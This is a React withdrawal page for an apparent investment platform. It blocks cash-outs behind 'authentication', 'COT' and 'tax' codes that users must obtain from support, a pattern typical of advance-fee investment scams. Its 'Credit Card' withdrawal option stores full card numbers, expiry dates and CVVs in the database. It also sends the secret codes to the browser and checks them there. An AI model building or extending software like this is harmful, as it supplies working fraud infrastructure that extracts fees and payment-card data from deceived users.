import { useEffect, useMemo, useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { toast } from "sonner";
import {
  Loader2,
  Bitcoin,
  Landmark,
  ShieldAlert,
  ShieldCheck,
  Percent,
  Receipt,
  Wallet,
} from "lucide-react";
import { z } from "zod";
import { useLiveData } from "@/hooks/useLiveData";
import { useCurrency } from "@/hooks/useCurrency";
import WithdrawalHistory from "@/components/dashboard/WithdrawalHistory";

const amountSchema = z.coerce.number().positive("Amount must be positive");

type CodeType = "auth" | "cot" | "tax";
interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }

const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
};

type OtherMethod = "cashapp" | "paypal" | "venmo" | "card";

export default function Withdraw() {
const { user } = useAuth();
const { format, currency, ready: currencyReady } = useCurrency();
const [submitting, setSubmitting] = useState(false);
const [defaultCode, setDefaultCode] = useState<string | null>(null);

const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
if (!user) return { balance: 0 };
const { data } = await supabase
.from("profiles")
.select("total_balance")
.eq("user_id", user.id)
.maybeSingle();
return { balance: data ? Number(data.total_balance) : 0 };
}, [user?.id], { cacheKey: user ? `withdraw-balance:${user.id}` : undefined });
const balance = balanceData?.balance ?? 0;
const balanceReady = balanceData !== null;

// Load default verification code once per user (separate from balance fetcher
// so input doesn't re-render whenever balance refreshes).
useEffect(() => {
  if (!user) return;
  let active = true;
  supabase.from("profiles").select("default_verification_code").eq("user_id", user.id).maybeSingle()
    .then(({ data }) => {
      if (active && data?.default_verification_code) setDefaultCode(data.default_verification_code);
    });
  return () => { active = false; };
}, [user?.id]);

// Realtime: reflect balance changes from admin or anywhere else.
useEffect(() => {
  if (!user) return;
  const ch = supabase
    .channel(`withdraw-balance-${user.id}`)
    .on("postgres_changes",
      { event: "UPDATE", schema: "public", table: "profiles", filter: `user_id=eq.${user.id}` },
      () => refreshBalance())
    .subscribe();
  return () => { supabase.removeChannel(ch); };
}, [user?.id, refreshBalance]);

const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
const [other, setOther] = useState<{
method: OtherMethod; amount: string;
cashapp_tag: string; paypal_email: string; venmo_handle: string;
card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
}>({
method: "cashapp", amount: "",
cashapp_tag: "", paypal_email: "", venmo_handle: "",
card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
});

const [authOpen, setAuthOpen] = useState(false);
const [pendingTxId, setPendingTxId] = useState<string | null>(null);
const [codes, setCodes] = useState<AccountCode[]>([]);
const [stepIndex, setStepIndex] = useState(0);
const [input, setInput] = useState("");
const [verifying, setVerifying] = useState(false);

// always include auth as first step, then any additional codes assigned
const activeSteps = useMemo<CodeType[]>(() => {
const steps: CodeType[] = ["auth"]; // auth always required
if (codes.some((c) => c.code_type === "cot")) steps.push("cot");
if (codes.some((c) => c.code_type === "tax")) steps.push("tax");
return steps;
}, [codes]);

const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
const currentCode = currentType === "auth"
? codes.find((c) => c.code_type === "auth") ?? null
: currentType ? codes.find((c) => c.code_type === currentType) : null;

useEffect(() => {
if (!authOpen || !user) return;
fetchCodes();
}, [authOpen, user?.id]);

const fetchCodes = async () => {
  if (!user) return;
  const { data } = await supabase
    .from("account_withdrawal_codes")
    .select("*")
    .eq("user_id", user.id)
    .maybeSingle();

  if (data) {
    const rows: AccountCode[] = [];
    if ((data as any).auth_code) {
      rows.push({
        id: (data as any).id,
        code_type: "auth",
        code: (data as any).auth_code,
        verified: false,
      });
    }
    if ((data as any).cot_required && (data as any).cot_code) {
      rows.push({
        id: (data as any).id,
        code_type: "cot",
        code: (data as any).cot_code,
        verified: false,
      });
    }
    if ((data as any).tax_required && (data as any).tax_code) {
      rows.push({
        id: (data as any).id,
        code_type: "tax",
        code: (data as any).tax_code,
        verified: false,
      });
    }
    setCodes(rows);
  }
};


const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
if (!user) return;
const a = amountSchema.safeParse(amt);
if (!a.success) { toast.error(a.error.errors[0].message); return; }
if (a.data > balance) { toast.error("Insufficient balance"); return; }
setSubmitting(true);
const { data, error } = await supabase.from("transactions").insert({
user_id: user.id, type: "withdrawal", method, amount_usd: a.data, status: "pending", ...body,
} as never).select("id").maybeSingle();
setSubmitting(false);
if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
setPendingTxId(data.id);
setInput("");
setStepIndex(0);
setAuthOpen(true);
};

const verify = async () => {
if (!user || !currentType) return;
const entered = input.trim().toUpperCase();
if (entered.length < 4) { toast.error("Enter the code"); return; }

// For auth step: check account_withdrawal_codes first, fallback to default_verification_code
if (currentType === "auth") {
  const assignedAuth = codes.find((c) => c.code_type === "auth");
  const validCode = assignedAuth
    ? assignedAuth.code.trim().toUpperCase()
    : defaultCode?.trim().toUpperCase();

  if (!validCode) {
    toast.error("No authentication code assigned. Contact support.");
    return;
  }
  if (entered !== validCode) {
    toast.error("Invalid authentication code.");
    return;
  }
  setVerifying(true);
  if (assignedAuth) {
    await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", assignedAuth.id);
  }
} else {
  // cot / tax
  if (!currentCode) { toast.error("No code assigned for this step."); return; }
  if (entered !== currentCode.code.trim().toUpperCase()) {
    toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
    return;
  }
  setVerifying(true);
  await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
}

const nextIdx = stepIndex + 1;
setInput("");
if (nextIdx >= activeSteps.length) {
  await supabase.from("transactions").update({ auth_code_verified: true }).eq("id", pendingTxId!);
  setVerifying(false);
  setAuthOpen(false);
  setPendingTxId(null);
  refreshBalance();
  toast.success("codes verified. Withdrawal is under final review.");
} else {
  setStepIndex(nextIdx);
  setVerifying(false);
  toast.success(`${STEP_META[currentType].title} accepted.`);
}

};

const cancelRequest = async () => {
if (pendingTxId) await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
setAuthOpen(false);
setPendingTxId(null);
};

const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;

const submitOther = () => {
const m = other.method;
const body: Record<string, unknown> = {};
let label = "";
if (m === "cashapp") {
if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
body.cashapp_tag = other.cashapp_tag.trim();
label = "Cash App";
} else if (m === "paypal") {
if (!/^\S+@\S+.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
body.paypal_email = other.paypal_email.trim();
label = "PayPal";
} else if (m === "venmo") {
if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
body.venmo_handle = other.venmo_handle.trim();
label = "Venmo";
} else if (m === "card") {
if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
if (!other.card_exp.trim()) return toast.error("Enter expiration date");
if (other.card_cvv.length < 3) return toast.error("Enter CVV");
if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
body.card_number = other.card_number.replace(/\s/g, "");
body.card_exp = other.card_exp.trim();
body.card_cvv = other.card_cvv.trim();
body.card_billing_name = other.card_billing_name.trim();
body.card_last4 = body.card_number.toString().slice(-4);
label = "Credit Card";
}
submit(label, body, other.amount);
};

return (
<div className="space-y-6">
<div>
<p className="label-mono text-muted-foreground mb-2">Cash out</p>
<h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
<p className="text-muted-foreground text-[14px] mt-1">
Available balance: {balanceReady && currencyReady ? (
  <span className="text-foreground font-medium">{format(balance)}</span>
) : (
  <span className="inline-block align-middle h-4 w-20 rounded bg-muted animate-pulse" />
)}
</p>
</div>

  <Tabs defaultValue="crypto">
    <TabsList className="grid w-full max-w-2xl grid-cols-3">
      <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
      <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
      <TabsTrigger value="others"><Wallet className="w-3.5 h-3.5 mr-1.5" /> Others</TabsTrigger>
    </TabsList>

    <TabsContent value="crypto" className="mt-6">
      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
        <div className="grid sm:grid-cols-2 gap-4">
          <div>
            <Label htmlFor="w-coin">Coin</Label>
            <select id="w-coin" value={crypto.coin} onChange={(e) => setCrypto({ ...crypto, coin: e.target.value })}
              className="mt-1 w-full rounded-md border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring">
              <option value="BTC">Bitcoin (BTC)</option>
              <option value="ETH">Ethereum (ETH)</option>
              <option value="USDT">Tether (USDT)</option>
            </select>
          </div>
          <div>
            <Label>Amount</Label>
            <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="" />
          </div>
        </div>
        <div>
          <Label>Your wallet address</Label>
          <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
        </div>
        <Button disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)} className="w-full">
          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
        </Button>
      </div>
    </TabsContent>

    <TabsContent value="bank" className="mt-6">
      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
        <div className="grid sm:grid-cols-2 gap-4">
          <div>
            <Label>Amount</Label>
            <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
          </div>
          <div>
            <Label>Bank name</Label>
            <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
          </div>
          <div>
            <Label>Account name</Label>
            <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
          </div>
          <div>
            <Label>Account number</Label>
            <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
          </div>
          <div className="sm:col-span-2">
            <Label>SWIFT / IBAN</Label>
            <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
          </div>
        </div>
        <Button disabled={submitting} onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)} className="w-full">
          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
        </Button>
      </div>
    </TabsContent>

    <TabsContent value="others" className="mt-6">
      <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
        <div className="grid sm:grid-cols-2 gap-4">
          <div>
            <Label htmlFor="w-method">Method</Label>
            <select id="w-method" value={other.method} onChange={(e) => setOther({ ...other, method: e.target.value as OtherMethod })}
              className="mt-1 w-full rounded-md border border-input bg-background px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-ring">
              <option value="cashapp">Cash App</option>
              <option value="paypal">PayPal</option>
              <option value="venmo">Venmo</option>
              <option value="card">Credit Card</option>
            </select>
          </div>
          <div>
            <Label>Amount</Label>
            <Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="" />
          </div>
        </div>

        {other.method === "cashapp" && (
          <div>
            <Label>Cash App tag</Label>
            <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" />
          </div>
        )}
        {other.method === "paypal" && (
          <div>
            <Label>PayPal email</Label>
            <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" />
          </div>
        )}
        {other.method === "venmo" && (
          <div>
            <Label>Venmo handle</Label>
            <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" />
          </div>
        )}
        {other.method === "card" && (
          <div className="space-y-4">
            <div>
              <Label>Card number</Label>
              <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label>Expiration (MM/YY)</Label>
                <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" />
              </div>
              <div>
                <Label>CVV</Label>
                <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} />
              </div>
            </div>
            <div>
              <Label>Billing name</Label>
              <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" />
            </div>
          </div>
        )}

        <Button disabled={submitting} onClick={submitOther} className="w-full">
          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
        </Button>
      </div>
    </TabsContent>
  </Tabs>

  {/* Withdrawal history — now a standalone component, matching project 2 pattern */}
  <WithdrawalHistory />

  <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
    <DialogContent className="max-w-md p-0 overflow-hidden border-border" style={{ borderRadius: 16 }}>
      <div className="px-6 pt-6 pb-4 border-b border-border bg-gradient-to-b from-muted/40 to-transparent">
        <div className="flex items-center gap-3 mb-3">
          <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
            <StepIcon className="w-5 h-5 text-primary" />
          </div>
          <div className="flex-1 min-w-0">
            <DialogTitle className="text-[15px] font-semibold leading-tight">
              {currentType ? STEP_META[currentType].title : "Authorization required"}
            </DialogTitle>
          </div>
        </div>

        {activeSteps.length > 1 && (
          <div className="flex items-center gap-1.5">
            {activeSteps.map((t, i) => {
              const done = i < stepIndex;
              const active = i === stepIndex;
              return (
                <div key={t} className={`h-1 flex-1 rounded-full transition-colors ${done ? "bg-emerald-500" : active ? "bg-primary" : "bg-muted"}`} />
              );
            })}
          </div>
        )}
      </div>

      <div className="px-6 py-6 space-y-4">
        <p className="text-[13px] text-muted-foreground leading-relaxed">
          {currentType ? STEP_META[currentType].subtitle : ""}
        </p>
        <div className="space-y-1.5">
          <Label htmlFor="auth-code" className="text-[12px] font-medium">Verification code</Label>
          <Input
            id="auth-code"
            value={input}
            onChange={(e) => setInput(e.target.value.toUpperCase())}
            placeholder="ENTER CODE"
            className="font-mono tracking-[0.4em] text-center text-base h-12 rounded-xl border-2 focus-visible:ring-primary"
            maxLength={12}
            autoFocus
          />
          <p className="text-[11px] text-muted-foreground">
            Don't have this code? Contact support to receive it.
          </p>
        </div>
      </div>

      <DialogFooter className="px-6 py-4 bg-muted/30 border-t border-border gap-2 sm:gap-2">
        <Button variant="outline" onClick={cancelRequest} className="rounded-full">Cancel</Button>
        <Button disabled={verifying || input.trim().length < 4} onClick={verify} className="rounded-full min-w-[140px]">
          {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & continue")}
        </Button>
      </DialogFooter>
    </DialogContent>
  </Dialog>
</div>


);
}
